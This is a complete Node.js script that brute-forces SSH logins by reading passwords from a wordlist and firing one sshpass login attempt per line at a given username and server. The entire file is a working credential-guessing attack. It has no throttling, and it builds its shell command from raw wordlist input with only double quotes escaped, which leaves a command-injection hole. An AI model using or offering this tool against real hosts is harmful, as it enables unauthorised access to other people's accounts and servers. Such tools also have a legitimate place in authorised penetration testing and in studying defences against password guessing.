const fs = require('fs')
const readline = require('readline')
const {exec} = require('child_process')

if (process.argv.length < 5) {
    console.log(`Usage: ${process.argv[1]} username server wordlist`)
    process.exit(1)
}

process.on('uncaughtException', (e) => console.error(e));

const rl = readline.createInterface({
    input: fs.createReadStream(process.argv[4]),
    crlfDelay: Infinity
});

rl.on('line', (password) => {
    console.log(`Trying ${password}`)

    exec(
	    'sshpass -p "' + password.replaceAll('"', '\\"') + `" ssh ${process.argv[2]}@${process.argv[3]}`,
	    (err, stdout, stderr) => {if (err) console.error(err)}
    )
})
